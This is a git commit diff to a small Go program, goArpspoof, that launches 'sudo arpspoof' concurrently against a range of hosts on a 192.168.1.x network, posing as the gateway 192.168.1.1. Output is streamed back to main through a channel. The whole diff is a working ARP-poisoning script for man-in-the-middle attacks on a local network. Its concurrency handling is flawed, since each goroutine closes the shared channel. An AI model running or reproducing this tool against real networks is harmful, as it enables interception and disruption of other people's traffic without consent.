cbd7deac19e0f59064507c3fda7bdb3f1fdc3502
Aniruddha Basak <codewithaniruddha@gmail.com>
2022-05-02 00:10:49 +0530

    Add arp function and return back text to main using channel
    Signed-off-by: Aniruddha Basak <codewithaniruddha@gmail.com>

--- goArpspoof/main.go
+++ goArpspoof/main.go
@@ -2,16 +2,12 @@
 package main
 
 import (
-	// "bufio"
+	"bufio"
 	"fmt"
 	"log"
 	"os/exec"
 	"strconv"
 	"sync"
-)
-
-var (
-	wg sync.WaitGroup
 )
 
 const (
@@ -20,12 +16,43 @@ const (
 	intrfc_flag = "-i"
 	intrfc      = "enp2s0"
 	target_flag = "-t"
-	host_flag   = "-r "
+	host_flag   = "-r"
 	host        = "192.168.1.1"
 )
 
+func arp(ch chan<- string, wg *sync.WaitGroup, target string) {
+	defer wg.Done()
+
+	log.Println(sudo, cmd, intrfc_flag, intrfc, target_flag, target, host_flag, host)
+	command := exec.Command(sudo, cmd, intrfc_flag, intrfc, target_flag, target, host_flag, host)
+
+	reader, err := command.StderrPipe()
+	if err != nil {
+		ch <- err.Error()
+		close(ch)
+	}
+
+	scanner := bufio.NewScanner(reader)
+	go func() {
+		for scanner.Scan() {
+			ch <- scanner.Text()
+		}
+	}()
+
+	err = command.Run()
+	if err != nil {
+		ch <- err.Error()
+		close(ch)
+	}
+	close(ch)
+}
+
 func main() {
+	var wg sync.WaitGroup
+
 	wg.Add(7)
+
+	ch := make(chan string, 7)
 
 	for i := 2; i < 10; i++ {
 		if i == 5 {
@@ -33,47 +60,13 @@ func main() {
 		}
 
 		target := fmt.Sprintf("192.168.1.%v", strconv.Itoa(i))
-		// target := fmt.Sprintf("192.168.1.%v", strconv.Itoa(i))
 
-		fmt.Println(sudo, cmd, intrfc_flag, intrfc, target_flag, target, host_flag, host)
+		go arp(ch, &wg, target)
+	}
 
-		go func() {
-			defer wg.Done()
-			// command := exec.Command("ping", target)
-			// command := exec.Command(sudo, cmd, intrfc_flag, intrfc, target_flag, target, host_flag, host)
-			command := exec.Command("sudo", "arpspoof", "-i", "enp2s0", "-t", target, "-r", "192.168.1.1")
-			err := command.Run()
-			if err != nil {
-				log.Fatal(err)
-			}
-		}()
+	for msg := range ch {
+		log.Println(msg)
 	}
 
 	wg.Wait()
-
-	// cmmand := exec.Command("sudo", "arpspoof", "-i", "enp2s0", "-t", "192.168.1.7", "-r", "192.168.1.1")
-	// cmmand := exec.Command("ping", "192.168.1.7")
-
-	// cmdReader, err := cmmand.StdoutPipe()
-	// if err != nil {
-	// 	log.Fatal(err)
-	// }
-	// scanner := bufio.NewScanner(cmdReader)
-	// go func() {
-	// 	for scanner.Scan() {
-	// 		log.Println(scanner.Text())
-	// 	}
-	// }()
-
-	// err = cmmand.Run()
-	// if err != nil {
-	// 	log.Fatal(err)
-	// }
-
-	// command := exec.Command("ping", target)
-	// command := exec.Command(sudo, cmd, intrfc_flag, intrfc, target_flag, "192.168.1.7", host_flag, host)
-	// command := exec.Command("sudo", "arpspoof", "-i", "enp2s0", "-t", "192.168.1.7", "-r", "192.168.1.1")
-	// err := command.Run()
-	// if err != nil {
-	// log.Fatal(err)
 }
